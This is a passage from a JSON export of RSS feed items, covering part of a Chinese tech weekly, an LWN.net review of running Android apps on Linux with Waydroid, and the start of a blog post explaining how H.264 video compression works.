src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061505.webp\" alt=\"\" title=\"\"></p>\n\n<p>一个国产软件，基于 Go+Vue 实现的 openLDAP 管理后台，可以作为打通 IM（钉钉、企业微信、飞书）与支持 ldap 认证的应用的桥梁。（<a href=\"https://github.com/ruanyf/weekly/issues/2450\">@eryajf</a> 投稿）</p>\n\n<p>7、<a href=\"https://japa.dev/\">Japa</a></p>\n\n<p>一个 Node.js 的测试框架，简单快速，功能也很多，而且可以直接运行测试脚本，不必通过测试框架来运行。</p>\n\n<p>8、<a href=\"https://github.com/xataio/screenshot\">@xata.io/screenshot</a></p>\n\n<p>这个网页脚本可以生成当前页面的截图。</p>\n\n<p>9、<a href=\"https://www.gitkraken.com/gitlens/features\">GitLens</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202203/bg2022031915.webp\" alt=\"\" title=\"\"></p>\n\n<p>一个 VSCode 的插件，大大增强了 Git 集成，可以在编辑器里面执行很多 Git 操作，特别适合多人合作的项目。</p>\n\n<h2>Deno 框架</h2>\n\n<p>Deno 是 JavaScript 语言的服务器运行环境，跟 Node.js 是竞争关系。</p>\n\n<p>Deno 本身的开发已经接近稳定了，下一步只要有一个好用的框架，就能推广了。</p>\n\n<p>1、<a href=\"https://fresh.deno.dev/\">Fresh 框架</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061401.webp\" alt=\"\" title=\"\"></p>\n\n<p>上周，基于 Deno 的 Fresh 框架发布了预览。</p>\n\n<p>该框架直接使用 TypeScript 脚本，号称零配置、零构建，页面由服务端渲染，客户端不需要 JS 生成内容，也没有多余的 JS 脚本，追求小而快，值得关注。</p>\n\n<p>2、<a href=\"https://alephjs.org/\">Aleph.js</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061402.webp\" alt=\"\" title=\"\"></p>\n\n<p>Aleph.js 是另一个基于 Deno 的全栈框架，类似于 Next.js，目前处于早期开发阶段，也可以关注。</p>\n\n<p>3、<a href=\"https://expressjs.com/\">Express</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202206/bg2022061403.webp\" alt=\"\" title=\"\"></p>\n\n<p>顺便提一下，老牌的 Node.js 框架 Express，最近要发布5.0版了。这是一件大事，因为4.0版是八年前发布的。这篇文章介绍了<a href=\"https://fusebit.io/blog/new-express-5-features/\">5.0版的新特性</a>。</p>\n\n<h2>可视化作品</h2>\n\n<p>1、<a href=\"http://he.net/3d-map/\">全球海底光缆</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022041001.webp\" alt=\"\" title=\"\"></p>\n\n<p>这个网页提供了一个互动式的地球，上面有全世界海底光缆和骨干机房的位置。</p>\n\n<p>2、<a href=\"https://www.drawaurora.com/\">极光</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022041002.webp\" alt=\"\" title=\"\"></p>\n\n<p>这个网页构造了一个极地的背景，让你手绘动态的极光效果。</p>\n\n<p>3、<a href=\"https://persepolis.getty.edu/\">波斯波利斯</a></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/220204/bg2022041004.webp\" alt=\"\" title=\"\"></p>\n\n<p>波斯波利斯是古代波斯帝国的首都，位于现在的伊朗，已经是一片废墟了。这个页面还原了这座雄伟的帝国都城，重建了 3D 街景，让你在其中漫游。</p>\n\n<h2>图片</h2>\n\n<p>1、<a href=\"https://zh.wikipedia.org/wiki/%E9%B9%B9%E6%B5%B7\">咸海</a></p>\n\n<p>哈萨克斯坦曾经有一个巨大的湖泊，叫做咸海，面积68000平方公里，相当于两个海南岛，是世界第四大湖泊。</p>\n\n<p>但是，从1960年代开始，前苏联建造了很多灌溉工程，从咸海大量引水，又没有补充，导致咸海快速干涸，目前已经接近消失了。</p>\n\n<p>1985年的咸海。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022001.webp\" alt=\"\" title=\"\"></p>\n\n<p>1997年的咸海。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022002.webp\" alt=\"\" title=\"\"></p>\n\n<p>2014年的咸海。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022003.webp\" alt=\"\" title=\"\"></p>\n\n<p>2、<a href=\"https://www.houseporn.ca/landscape/article/the_wall_housing_structure_in_fermont_quebec\">住宅墙</a></p>\n\n<p>加拿大有一个小镇，靠近北极，终年刮着强劲的北风。</p>\n\n<p>为了挡风，当地修建了高50米，长1.3公里的挡风墙，同时这堵墙里面还是住宅、商业和教育设置，里面可以住人。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022006.webp\" alt=\"\" title=\"\"></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022007.webp\" alt=\"\" title=\"\"></p>\n\n<p>因为有了这堵住宅墙，小镇居民就拥有了一个无风的、温暖的小气候。 </p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022008.webp\" alt=\"\" title=\"\"></p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022022009.webp\" alt=\"\" title=\"\"></p>\n\n<h2>文摘</h2>\n\n<p>1、<a href=\"https://www.ifanr.com/app/1448161\">如何增加牙膏的销量</a></p>\n\n<p>1950年代，一家国外的牙膏公司，向公众征求能够大幅提高销售额的点子。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202202/bg2022020805.webp\" alt=\"\" title=\"\"></p>\n\n<p>几天之后，有一个人来应征，声称他有办法让销售额快速增长40%，而且实施起来不需要很大成本。他要价10万美元。</p>\n\n<p>公司管理层犹豫了数周，最后还是同意了给钱。</p>\n\n<p>等到法律手续和付款流程完成后，这个人给出装有一张小纸条的信封，小纸条上只有四个英文单词：</p>\n\n<blockquote>\n  <p>\"Make The Hole Bigger\"</p>\n</blockquote>\n\n<p>这句话翻译成中文，就是\"让牙膏开口更大一点\"。</p>\n\n<p>此前，管状牙膏的开口一般是5毫米直径。稍加计算就可以知道，当直径从5毫米增加到6毫米时，假设挤出的牙膏长度不变，挤出量会增加44%。</p>\n\n<p>原先顾客用一管牙膏的时间，现在要1.4管牙膏才能满足需求。看似很小的改变，却刷新了这家公司的销售记录，创造了历史。</p>\n\n<h2>言论</h2>\n\n<p>1、</p>\n\n<p>一件事最可怕的时刻，总是在你开始做之前。</p>\n\n<p>-- <a href=\"https://gretchenrubin.com/2016/08/according-stephen-king-scariest-moment-always-____\">斯蒂芬·金</a></p>\n\n<p>2、</p>\n\n<p>对于那些没有想象力的人来说，保持常态就是他们的理想。</p>\n\n<p>-- <a href=\"https://quotefancy.com/quote/782361/C-G-Jung-Normality-is-a-fine-ideal-for-those-who-have-no-imagination\">荣格</a></p>\n\n<p>3、</p>\n\n<p>IT 行业与传统制造业有一个重要区别，就是 IT 行业有着严重的垄断。</p>\n\n<p>全世界的智能手机有70亿部，比汽车多出5倍（14亿辆）。但是，智能手机制造商比汽车制造商少了好几个数量级。搜索引擎、社交网络、操作系统都是这样，几个巨头就垄断了整个市场。</p>\n\n<p>-- <a href=\"https://news.ycombinator.com/item?id=28896320\">Hacker News 读者</a></p>\n\n<p>4、</p>\n\n<p>电动汽车虽然售价高，但是每公里的行驶成本低，因此用得越久越划算。这就要求汽车厂商制造耐用的电动汽车。</p>\n\n<p>-- <a href=\"https://news.ycombinator.com/item?id=30914512\">Hacker News 读者</a></p>\n\n<p>5、</p>\n\n<p>2021年只有两种人在写博客，一种是试图建立受众并从中获利的人，另一种是只想写出想法、而没有任何目标的人。</p>\n\n<p>这两种人的行为都非常好。选择做你喜欢的事，坚持下去，它们最终都可以对他人产生价值。</p>\n\n<p>-- <a href=\"https://bhupesh.me//what-i-have-learned-from-blogging-so-far-retrospect/\">《我从博客中学到的东西》</a></p>\n\n<h2>历史上的本周</h2>\n\n<p>2021年（第 162 期）：<a href=\"https://www.ruanyifeng.com/blog/2021/06/weekly-issue-162.html\">生活就像《吃豆人》游戏</a></p>\n\n<p>2020年（第 111 期）：<a href=\"https://www.ruanyifeng.com/blog/2020/06/weekly-issue-111.html\">智能电视的误区</a></p>\n\n<p>2019年（第 60 期）：<a href=\"https://www.ruanyifeng.com/blog/2019/06/weekly-issue-60.html\">一本介绍人类起源的学术自传</a></p>\n\n<p>2018年（第 9 期）：<a href=\"https://www.ruanyifeng.com/blog/2018/06/weekly-issue-9.html\">身份证可以植入人体</a></p>\n\n<h2>订阅</h2>\n\n<p>这个周刊每周五发布，同步更新在<a href=\"http://www.ruanyifeng.com/blog\">阮一峰的网络日志</a>和<a href=\"http://weixin.sogou.com/weixin?query=%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97\">微信公众号</a>。</p>\n\n<p>微信搜索\"阮一峰的网络日志\"或者扫描二维码，即可订阅。</p>\n\n<p><img src=\"https://cdn.beekka.com/blogimg/asset/202103/bg2021030402.jpg\" alt=\"\" title=\"\"></p>\n\n<p>（完）</p>\n<div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href=\"https://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr title=\"2022-06-17T08:37:40+08:00\">2022年6月17日</abbr></li>\n\n</ul></div><div></div>"
    },
    "origin": {
        "streamId": 25,
        "title": "阮一峰的网络日志",
        "htmlUrl": "http://www.ruanyifeng.com/blog/",
        "feedUrl": "https://feeds.feedburner.com/ruanyifeng"
    }
},
{
    "id": "901459",
    "timestampUsec": "1658250792213488",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Android apps on Linux with Waydroid",
    "author": ";jake",
    "published": 1658248860,
    "updated": 1658248860,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/901459/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           <p>July 19, 2022</p>\n           <p>This article was contributed by Sam Sloniker</p>\n           </div>\n<p>It is not uncommon for users to want to run a program targeted to one\noperating system on another type of system. With the increasing prevalence of\nsmartphones, Android has become the world's most widely used operating\nsystem. So users may want to run Android apps on Linux systems in order\nto get access to a game or other app that is not available in a\nLinux version or to develop mobile apps on their desktop system.\nThe <a href=\"https://waydro.id/\">Waydroid</a> project provides a way to run those\napps on Linux, which means they can run on a variety of devices, including\nLinux-based smartphones like <a href=\"https://lwn.net/Articles/883073\">the PinePhone</a>.  </p>\n\n<p>Waydroid is similar in concept to the Windows compatibility layer <a href=\"https://winehq.org/\">Wine</a>. The fact that Android runs on the Linux\nkernel makes properly running Android apps on other Linux systems much\nsimpler than doing so for Windows software. It is not possible to simply run\nAndroid apps directly on a regular Linux operating system, though, because\nthey depend on a different user-space environment. However, by using kernel features such as\nnamespaces, it is possible to run the entire Android user space in a\ncontainer on a Linux system.  This is the\ntechnique used by Waydroid; it runs a complete Android system in a\ncontainer in much the same way that it is possible to, for example, run\nDebian in a container on Fedora. That allows Waydroid to have better\nperformance than it would have running in a virtual machine or an emulator. </p>\n\n<a href=\"https://lwn.net/Articles/901578#homescreen\">\n<img src=\"https://static.lwn.net/images/2022/waydroid-pinephone-homescreen-sm.png\" border=\"0\" hspace=\"5\" align=\"right\" width=\"150\" height=\"300\" alt=\"[Home screen on PinePhone]\" title=\"Home screen on PinePhone\">\n</a>\n\n<p>Waydroid runs a custom build of the <a href=\"https://lineageos.org/\">LineageOS</a> Android distribution. It has all of\nthe software features of LineageOS, though it does not emulate all device\nfeatures. For example, cameras and telephony features are not supported; WiFi and Bluetooth\ncannot be configured from within Waydroid either.\nNetworking is\nsupported, however; Waydroid always shows an Ethernet connection, which actually\nroutes traffic through the host. \nAudio input and output both\nwork using the host's configured audio paths.\n Other than these and a few other minor differences,\nWaydroid is mostly similar \nto a regular Android device without Google apps.  </p>\n\n<h4>Hardware support</h4>\n\n<p>Waydroid supports 32-bit and 64-bit x86 and Arm. 64-bit Arm has the best\napp support, because it is the architecture used by the vast majority of\nregular Android devices, but many apps do also work on 64-bit x86.\nI did not test any 32-bit\ndevices, though.\n Many apps are\nwritten entirely in Java and/or Kotlin, both of which compile to\narchitecture-independent Java virtual machine (JVM) bytecode; these apps work on all architectures\nwithout any extra effort from the developer. Other apps include native code\ncompiled from languages like C or C++; these apps must be compiled for each\nplatform, but many developers still build for x86 because most\nChromebooks, many of which have x86 processors, also support Android apps.  </p>\n\n<p>Intel and AMD GPUs, as well as the GPUs integrated into most Arm SoCs,\nare supported for hardware graphics acceleration. NVIDIA GPUs are not\nsupported  (other than the GPUs\nin Tegra Arm SoCs), but Waydroid does support software\nrendering as a workaround.  </p>\n\n<p>I tested Waydroid on my PinePhone (64-bit Arm, running DanctNIX with\nPhosh), two laptops (Dell Inspiron and Lenovo IdeaPad 3,\nboth x86-64 running Arch Linux), and my tablet (Microsoft\nSurface Go 2, also x86-64 with Arch); all of the devices have\ntouchscreens. I used Wayland on all four, \nbecause Waydroid requires it.   </p>\n\n<p>Unsurprisingly, the overall experience is best on the phone. The\nexperience with Waydroid on the PinePhone is not much different from using\na regular Android phone, other than the limitations of Waydroid that are\nnot present in normal Android devices, such as telephony and the camera not\nworking. Because the PinePhone's hardware is slower than most other\nAndroid devices, I disabled user-interface animations.  This is an issue with the\nhardware, however, not with Waydroid. After disabling animations, Waydroid is almost\nas responsive as an actual Android phone.  </p>\n\n<a href=\"https://lwn.net/Articles/901578#laptop\">\n<img src=\"https://static.lwn.net/images/2022/waydroid-laptop-2048-sm.png\" border=\"0\" hspace=\"5\" align=\"left\" width=\"300\" height=\"168\" alt=\"[2048 game on laptop]\" title=\"2048 game on laptop\">\n</a>\n\n<p>Waydroid also works quite well on the laptops. Because most apps are not\noptimized for use with a keyboard and mouse, I use the laptops'\ntouchscreens much more in Waydroid than I do with regular Linux software.\nQuite a few apps are designed to support\nkeyboard and mouse input for compatibility with Chromebooks, so those tend\nto work even better. The experience would be much worse on a desktop or a\nnon-touch laptop, but \nChromebook-optimized apps would still work well.  </p>\n\n<p>On the tablet, touch gestures did not work properly (a swipe was\nregistered as a long tap at a single point), though they work fine in Linux\nitself; this made Waydroid almost\nunusable on the tablet. Because of this problem, I did not do much\ntesting. Surface devices often have problems with Linux, though, so it is likely\nthat this is a device-specific issue (possibly even specific to my software\nsetup) rather than a general problem with Waydroid on tablets.  </p>\n\n<p>Waydroid does not work with the default kernel provided by some\ndistributions because it requires the <tt>binder</tt> and <tt>ashmem</tt>\nmodules. It appears that Ubuntu and Debian both provide these modules by\ndefault, while Fedora and Arch do not.  I did not check any other\ndistributions. On the laptop and tablet, I installed <a href=\"https://archlinux.org/packages/testing/x86_64/linux-zen/\"><tt>linux-zen</tt></a>, \nwhich is an alternative kernel available for Arch that\ndoes provide the modules. The default kernel used in DanctNIX on the PinePhone provides\nthem, so I did not have to replace its kernel.  </p>\n\n<p>\nThe process for installing and running Waydroid varies depending on the  distribution.\nI followed the <a href=\"https://wiki.archlinux.org/title/Waydroid\">instructions on the Arch\nwiki</a> for the laptops, so I installed <tt>waydroid</tt> and <tt>waydroid-image</tt> from\nthe <a href=\"https://aur.archlinux.org/\">Arch User Repository</a> (AUR)\nafter installing the Zen kernel.  After that, Waydroid had to be initialized\nwith \"<tt>sudo waydroid init</tt>\" and the\n<tt>waydroid-container</tt> service needed to be enabled and started for\nsystemd.  The <a href=\"https://docs.waydro.id/\">Waydroid\ndocumentation</a> has <a href=\"https://docs.waydro.id/usage/install-on-desktops\">instructions</a>\nfor installing it on other distributions.\n</p> \n\n<p>Waydroid has two modes, multi-window mode and full user interface (UI) mode. When\nmulti-window mode works properly, Android apps are integrated into the\ndesktop as if they were Linux desktop apps. On all four devices, however,\nmulti-window mode has several bugs that made it difficult to use, so I only\nuse full UI mode. This runs the entire Android UI in a single window. \n</p>\n\n<p>\nWaydroid creates <tt>.desktop</tt> files for every app installed, including\nthe default system apps, and this cannot be disabled. These desktop entries\nlaunch the apps in multi-window mode. If you only use full UI mode,\nhowever, they just create unnecessary clutter in the menus. The icons can\nbe hidden by \nadding <tt>Hidden=true</tt> to the end of each <tt>waydroid.*.desktop</tt>\nfile in <tt>~/.local/share/applications</tt>.  Deleting the\n<tt>.desktop</tt> files is futile, because Waydroid will simply create them\nagain the next time it is started.</p>\n\n<h4>App support</h4>\n\n<p>As would be expected, app support is best on the PinePhone, both because\nit is an Arm device and because most Android apps are primarily designed\nfor phones.  On the laptop, most apps are usable, although mouse support is\nincomplete in many apps; the touchscreen works fine.  </p>\n\n<a href=\"https://lwn.net/Articles/901578#fdroid\">\n<img src=\"https://static.lwn.net/images/2022/waydroid-pinephone-fdroid-sm.png\" border=\"0\" hspace=\"5\" align=\"right\" width=\"150\" height=\"300\" alt=\"[F-Droid]\" title=\"F-Droid\">\n</a>\n\n<p>One of the most significant differences between Waydroid and a typical\nAndroid device is its lack of Google apps. This is certainly beneficial for\nprivacy, but it does have some drawbacks. Many apps cannot be installed or\nwill not work properly without Google apps and services.  </p>\n\n<p>The Google Play Store is not available, significantly limiting the\nnumber of apps available to install. Many apps that would otherwise work\nfine in Waydroid, especially proprietary\nones, cannot easily be installed\nbecause they are only distributed through the Play Store. </p>\n\n<p><a href=\"https://f-droid.org/\">F-Droid</a> works well in Waydroid, and\ndoes have good mouse support. The vast majority of apps listed with no\n\"anti-features\" will work, and many with anti-features also work. The\nanti-feature most likely to cause problems is \"non-free dependencies\":\noften, the non-free software that this anti-feature refers to is Google\nPlay Services. This can cause problems ranging from no push notifications\nor missing maps to apps that do not even open.  Of course, apps that depend\non unsupported hardware features will not work properly regardless of\nwhether or not they have any anti-features. \n</p>\n\n<p>It appears to be possible to make some of these apps work by installing <a href=\"https://microg.org/\">microG</a>, but I did not test this due to\nconcerns that using it may violate the <a href=\"https://play.google.com/about/play-terms/index.html\">Terms of\nService</a> for Google Play. <a href=\"https://f-droid.org/en/packages/com.aurora.store/\">Aurora Store</a>\nis an alternative Play Store client that most likely works in Waydroid and\ncould be used to install many Play-Store-only apps; I did not test it\neither for the same reason.  </p>\n\n<p>One limitation of Waydroid is that when a link is clicked in an Android\napp, there is no option to open the link in the host browser without\ninstalling additional software. There is <a href=\"https://github.com/waydroid/waydroid/issues/210\">an open issue on the\nWaydroid repository for this</a>, but as a workaround until this feature is\nadded, I wrote a <a href=\"https://git.kj7rrv.com/kj7rrv/passthroughbrowser\">Python script and\nAndroid app</a> to add it. The Android app is installed in the Waydroid\ncontainer and set as the default browser (although it is not really a\nbrowser, it is configured to appear in the list of available browsers),\nwhile the Python script runs on the host OS. When a link is clicked in an\nAndroid app, the \"browser\" connects to the Python script, which then opens\nthe real browser on the host.  </p>\n\n<p>\nWaydroid development takes place in a <a href=\"https://github.com/waydroid\">GitHub repository</a>. The\nproject's Web site <a href=\"https://waydro.id/#team\">lists three members of the\ndevelopment team</a>, and GitHub currently shows 25 contributors to <a href=\"https://github.com/waydroid/waydroid\">the main\nrepository</a>. The latest release is <a href=\"https://github.com/waydroid/waydroid/releases/tag/1.2.1\">v1.2.1</a>,\nwhich came out\nin April, but there has been quite a bit of development since\nthen. Overall, releases\nhave been somewhat sporadic; v1.1.0, the first release listed on GitHub, was published in\nSeptember 2021, followed by v1.1.1 two days later. The next release,\nv1.2.0, came out a month after that, then there were no releases between\nOctober and April.\n</p>\n\n<h4>Conclusion</h4>\n\n<p>Overall, despite some issues and drawbacks, Waydroid is a useful way to\nrun Android apps on Linux, especially on non-Android Linux phones. Like any\nsoftware, it has some bugs, but most of its problems are caused by the\ninherent differences between a computer running only or almost only FOSS\nand a smartphone with large amounts of proprietary software; services\nconsidered essential on most Android devices are missing in Waydroid. And,\nwhen it is used on a desktop or laptop, the input devices (keyboard and\nmouse) are fundamentally different from the touchscreens that Android (and most of its\napps) are primarily designed for. The Android UI and many\napps already have good keyboard and mouse support for compatibility with\nChromebooks, but it is still quite evident that Android is primarily designed for smartphones.  </p>\n\n<p>Unfortunately, devices without Google Play Services and the Play Store are so rare that\nthere is little incentive for developers to avoid using Play Services or to\npublish their apps in alternative channels; the\nprimary exceptions are developers of FOSS and/or privacy-focused apps. Of\ncourse, some Linux users would not want to use other apps anyway, so this\nmay not be an issue for a lot of Waydroid users.  </p>\n\n<p>Even with these limitations, Waydroid significantly expands the range of\nsoftware available to Linux users, especially those with Linux\nsmartphones. Of course, it is not an ideal solution, just as Wine is not an ideal\nsolution to the shortage of Linux desktop software; it would certainly be\nbetter to have more native mobile-Linux apps. Overall, however,\nWaydroid is quite useful to Linux phone users who do not want to be limited\nto the few native apps designed for Linux phones.   Waydroid is definitely\nworth trying on any device where one wants to be able to run Android apps.\n</p><br clear=\"all\"><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Archives/GuestIndex/\">GuestArticles</a></td><td><a href=\"https://lwn.net/Archives/GuestIndex/#Sloniker_Sam\">Sloniker, Sam</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "5d6fdd6ab4388b00176164dc",
    "timestampUsec": "1658511234232333",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "H.264 is Magic",
    "author": ";Sid Bala",
    "published": 1478117940,
    "updated": 1478117940,
    "alternate": [
        {
            "href": "https://sidbala.com/h-264-is-magic/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>H.264 is a video compression codec standard. It is ubiquitous - internet video, Blu-ray, phones, security cameras, drones, everything. Everything uses H.264 now.</p>\n<p>H.264 is a remarkable piece of technology. It is the result of 30+ years of work with one single goal: To reduce the bandwidth required for transmission of full-motion video.</p>\n<p>Technically, it is very interesting. This post will give insight into some of the details at a high level - I hope to not bore you too much with the intricacies. Also note that many of the concepts explained here apply to video compression in general, and not just H.264.</p>\n<blockquote>\n<p>Why even compress anything?</p>\n</blockquote>\n<p>A simple uncompressed video file will contain an array of 2D buffers containing pixel data for each frame. So it's a 3D (2 spatial dimensions and 1 temporal) array of bytes. Each pixel takes 3 bytes to store - one byte each for the three primary colors (red, green and blue).</p>\n<p>1080p @ 60 Hz = 1920x1080x60x3 =&gt; ~<strong>370 MB/sec</strong> of raw data.</p>\n<p>This is next to impossible to deal with. A 50GB Blu-ray disk will only hold ~2 mins. You can't move it anywhere fast. Even SSDs have trouble dumping this straight from RAM to Disk[^1].</p>\n<p>So yeah. We need compression.</p>\n<blockquote>\n<p>Why <em>H.264</em> compression?</p>\n</blockquote>\n<p>Yes, I will answer this. But first let me show you something. Here is the Apple Homepage:</p>\n<p><img src=\"https://sidbala.com/content/images/2016/11/HomePage.png\" alt loading=\"lazy\"></p>\n<p>I captured the screen of this home page and produced two files:</p>\n<ul>\n<li><a href=\"https://sidbala.com/content/images/2016/11/outputFrame.png\">PNG screenshot of the Apple homepage</a> <strong>1015KB</strong></li>\n<li><a href=\"https://s3-us-west-2.amazonaws.com/sidbala-blog/VideoH264.mp4\">5 Second 60fps H.264 video of the same Apple homepage</a> <strong>175KB</strong></li>\n</ul>\n<blockquote>\n<p>Eh. What? Those file sizes look switched.</p>\n</blockquote>\n<p>No, they're right. The H.264 video, 300 frames long is 175KB. A single frame of that video in PNG is 1015KB.</p>\n<p>It looks like we're storing 300 times the amount of data in the video. But the file size is a fifth. So H.264 would seem to be 1500x as efficient as PNG.</p>\n<blockquote>\n<p>How is this even possible? All right, what's the trick?</p>\n</blockquote>\n<p>There are very many tricks! H.264 uses all the tricks you can think of (and tons you can't think of). Let's go through the important ones.</p>\n<h6>Shedding weight</h6>\n<p>Imagine you're building a car for street racing. You need to go faster. What is the first thing you do? You shed some weight. Your car weighs 3000 lbs. You throw away stuff you don't need. Those back seats? pfft. Chuck those. That subwoofer? Gone. No music for you. Air Conditioning? Yeah, ditch it. Transmission? Ye..no. Wait! We're gonna need that.</p>\n<p>You remove everything except the things that matter.</p>\n<p>This concept of throwing away bits you don't need to save space is called <strong>lossy</strong> compression. H.264 is a lossy codec - it throws away less important bits and only keeps the important bits.</p>\n<p>PNG is a <strong>lossless</strong> codec. It means that nothing is thrown away. Bit for bit, the original source image can be recovered from a PNG encoded image.</p>\n<blockquote>\n<p>Important bits? How does the algorithm know what bits in my frame are important?</p>\n</blockquote>\n<p>There are few obvious ways to trim out images. Maybe the top right quadrant is useless all the time. So maybe we can zero out those pixels and discard that quadrant. We would use only 3/4th of the space we need. ~2200 lbs now. Or maybe we can crop out a thick border around the edges of the frame, the important stuff is in the middle anyway. Yes, you could do these. But H.264 doesn't do this.</p>\n<blockquote>\n<p>What does H.264 actually do?</p>\n</blockquote>\n<p>H.264, like other lossy image algorithms, discards detail information. Here is a close-up of the original compared with the image post-discard.</p>\n<p><img src=\"https://sidbala.com/content/images/2016/11/CompressedImage-1.jpg\" alt loading=\"lazy\"></p>\n<p>See how the compressed one does not show the holes in the speaker grills in the MacBook Pro? If you don't zoom in, you would even notice the difference. The image on the right weighs in at <strong>7%</strong> the size of the original - and we haven't even compressed the image in the traditional sense. Imagine your car weighed just 200 lbs!</p>\n<blockquote>\n<p>7% wow! How do you discard detail information like that?</p>\n</blockquote>\n<p>For this we need a quick math lesson.</p>\n<h6>Information Entropy</h6>\n<p>Now we're getting to the juicy bits! Ha puns! If you took an information theory class, you might remember information entropy. Information entropy is the number of bits required to represent some information. Note that it is not simply the size of some dataset. It is minimum number of bits that must be used to represent all the information contained in a dataset.</p>\n<p>For example, if your dataset is the result of a single coin toss, you need 1 bit of entropy. If you have record two coin tosses, you'll need 2 bits. Makes sense?</p>\n<p>Suppose you have some strange coin - you've tossed it 10 times, and every time it lands on heads. How would you describe this information to someone? You wouldn't say HHHHHHHHH. You would just say \"10 tosses, all heads\" - bam! You've just compressed some data! Easy. I saved you hours of mindfuck lectures. This is obviously an oversimplification, but you've transformed some data into another shorter representation of the same information. You've reduced data <strong>redundancy</strong>. The information entropy in this dataset has not changed - you've just converted between representations. This type of encoder is called an <strong>entropy encoder</strong> - it's a general-purpose lossless encoder that works for any type of data.</p>\n<h6>Frequency Domain</h6>\n<p>Now that you understand information entropy, let's move on to transformations of data. You can represent data in some fundamental units. If you use binary, you have 0 and 1. If you use hex, you have 16 characters. You can easily transform between the two systems. They are essentially equivalent. So far so good? Ok!</p>\n<p>Now, some imagination! Imagine you can transform any dataset that varies over space(or time) - something like the brightness value of an image, into a different coordinate space. So instead of x-y coordinates, let's say we have frequency coordinates. freqX and freqY are the axes now. This is called a <strong>frequency domain</strong> representation. There is another mindfuck mathematical theorem[^2] that states that you can do this for any data and you can achieve a perfect lossless transformation as long as freqX and freqY are high enough.</p>\n<blockquote>\n<p>Okay, but what the freq are freqX and freqY?</p>\n</blockquote>\n<p>freqX and freqY are some other set of basis units. Just like when we switch from binary to hex, we have a different fundamental unit, we're switching from the familiar X-Y to freqX and freqY. Hex 'A' looks different from binary '1010'. Both mean the same thing, but <strong>look</strong> different. So here is what our image looks like in the frequency domain:</p>\n<p><img src=\"https://sidbala.com/content/images/2016/11/BasicFFT-2.png\" alt loading=\"lazy\"></p>\n<p>The fine grill on that MacBook pro has a high information content in the higher frequency components of that image. Finely varying content = high frequency components. Any sort of gradual variation in the color and brightness - such as gradients are low frequency components of that image. Anything in between falls in between. So fine details = high freq. Gentle gradients = low freq. Makes sense?</p>\n<p>In the frequency domain representation, the low frequency components are near the center of that image. The higher frequency components are towards of the edges of the image.</p>\n<blockquote>\n<p>Okay. Kinda makes sense. But why do all this?</p>\n</blockquote>\n<p>Because now, you can take that frequency domain image and then mask out the edges - discard information which will contain the information with high frequency components. Now if you convert back to your regular x-y coordinates, you'll find that the resulting image looks similar to the original but has lost some of the fine details. But now, the image only occupies a fraction of the space. By controlling how big your mask is, you can now tune precisely how detailed you want your output images to be.</p>\n<p>Here is the close-up of the laptop in the home page again. Except now, there is a circular border mask that's been applied.</p>\n<p><img src=\"https://sidbala.com/content/images/2016/11/QuantizationHorizontalWithMasks-1.jpg\" alt loading=\"lazy\"></p>\n<p>The numbers represent the information entropy of that image as a fraction of the original. Even at 2%, you won't notice the difference unless you're at this zoom level. 2%! - your car now weighs 60 lbs!</p>\n<p>So that's how you shed weight. This process in lossy compression is called <strong>quantization</strong>[^3].</p>\n<blockquote>\n<p>Okay. Impressive, I guess. What else you got?</p>\n</blockquote>\n<h6>Chroma Subsampling.</h6>\n<p>The human/eye brain system is not very good at resolving finer details in color. It can detect minor variations in brightness very easily but not color. So there must be some way to discard color information to shed even more weight.</p>\n<p>In a TV signal, R+G+B color data gets transformed to Y+Cb+Cr. The Y is the luminance (essentially black and white brightness) and the Cb and Cr are the chrominance (color) components. RGB and YCbCr are equivalent in terms of information entropy.</p>\n<blockquote>\n<p>Why unnecessarily complicate? RGB not good enough for you?</p>\n</blockquote>\n<p>Back before we had color TV, we only had the Y signal. And when color TVs just started coming along, engineers had to figure out a way to transmit RGB color along with Y. Instead of using two separate data streams, they wisely decided to encode the color information into Cb and Cr and transmit that along with the Y information. That way, BW TVs would only look at the Y component. Color TVs will, in addition, look at the chrominance components and convert to RGB internally.</p>\n<p>But check out the trick: the Y component gets encoded at full resolution. The C components only at a quarter resolution. Since the eye/brain is terrible at 